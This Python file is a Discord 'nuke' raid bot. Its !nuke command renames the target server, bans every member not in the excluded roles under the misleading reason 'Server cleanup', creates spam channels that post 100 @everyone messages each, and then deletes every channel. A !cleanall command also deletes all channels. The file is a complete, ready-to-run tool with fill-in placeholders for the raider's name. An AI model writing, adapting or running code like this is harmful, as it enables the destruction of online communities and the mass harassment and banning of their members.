import discord
from discord.ext import commands
import asyncio
import logging
import time

# Configuration
TOKEN = ""  # Use an environment variable for security
GUILD_NAME = '(your name) IS EVERYWHERE'  # Server rename name
CHANNEL_NAME = 'Testing'  # Spam channel name
SPAM_MESSAGE = "@everyone **Wake up, (your desired name) IS HERE** :joy: https://tenor.com/view/sinister-nuked-nuke-discord-raid-gif-24293736"
AUTHORIZED_USERS = [123456789012345678, 12443647567568578]  # Add authorized user IDs here
EXCLUDED_ROLES = ["Admin", "Moderator", "Owner"]  # Roles to exclude from ban/kick

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True
intents.message_content = True

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    test_intents()

def test_intents():
    logging.info("\nTesting intents:")
    intents_dict = {
        "guilds": intents.guilds,
        "members": intents.members,
        "messages": intents.messages,
        "message_content": intents.message_content,
        "emojis": intents.emojis,
        "voice_states": intents.voice_states,
        "reactions": intents.reactions,
        "presences": intents.presences,
    }
    for intent_name, enabled in intents_dict.items():
        status = "ALLOWED" if enabled else "DENIED"
        logging.info(f"Intent '{intent_name}': {status}")

@bot.command()
async def nuke(ctx):
    if ctx.author.id not in AUTHORIZED_USERS:
        await ctx.send("You are not authorized to use this command.")
        return

    guild = ctx.guild
    start_time = time.time()

    try:
        await guild.edit(name=GUILD_NAME)
        logging.info(f'Server renamed to: {GUILD_NAME}')

        banned_members = []
        banned_count = 0
        for member in guild.members:
            if member.bot or member.id in AUTHORIZED_USERS or any(role.name in EXCLUDED_ROLES for role in member.roles):
                continue
            try:
                await member.ban(reason="Server cleanup")
                banned_members.append(member.name)
                banned_count += 1
            except Exception as e:
                logging.error(f"Error banning {member}: {e}")

        spam_count = 0
        tasks = []
        for i in range(5):  # spam channels 5
            channel = await guild.create_text_channel(CHANNEL_NAME)
            logging.info(f'Channel created: {CHANNEL_NAME}')
            tasks.append(spam_messages(channel))
            spam_count += 1


        await asyncio.gather(*tasks)

        deleted_channels = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted_channels += 1
            except Exception as e:
                logging.error(f'Failed to delete channel {channel.name}: {e}')
        
        elapsed_time = time.time() - start_time

        owner_name = guild.owner.name if guild.owner else "Unknown"
        info_message = (
            f"Nuke operation completed.\n"
            f"Server Owner: {owner_name}\n"
            f"Banned Members: {', '.join(banned_members)} ({banned_count} total)\n"
            f"Spam Channels Created: {spam_count}\n"
            f"Messages Spammed: {spam_count * 100}\n"
            f"Time Taken: {elapsed_time:.2f} seconds"
        )
        try:
            await ctx.send(info_message)
        except discord.NotFound:
            pass 

    except Exception as e:
        logging.critical(f'Critical error during nuke operation: {e}')

async def spam_messages(channel):
    for _ in range(100):
        try:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(0.01)
        except Exception as e:
            logging.error(f'Error sending message in {channel.name}: {e}')
            break

@bot.command()
async def cleanall(ctx):
    if ctx.author.id not in AUTHORIZED_USERS:
        await ctx.send("You are not authorized to use this command.")
        return

    guild = ctx.guild
    try:
        await guild.edit(name="Cleaned Server")
        logging.info(f'Server name reset to: Cleaned Server')

        
        deleted_channels = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted_channels += 1
            except Exception as e:
                logging.error(f'Failed to delete channel {channel.name}: {e}')

        if deleted_channels > 0:
            cleaned_channel = await guild.create_text_channel("cleaned")
            await cleaned_channel.send("This server has been cleaned. All previous channels have been deleted.")
            logging.info("Created 'cleaned' channel.")
        try:
            await ctx.send(f"Cleaned the server. Deleted {deleted_channels} channels.")
        except discord.NotFound:
            pass 

    except Exception as e:
        logging.critical(f'Critical error during cleanall operation: {e}')

if __name__ == "__main__":
    bot.run(TOKEN)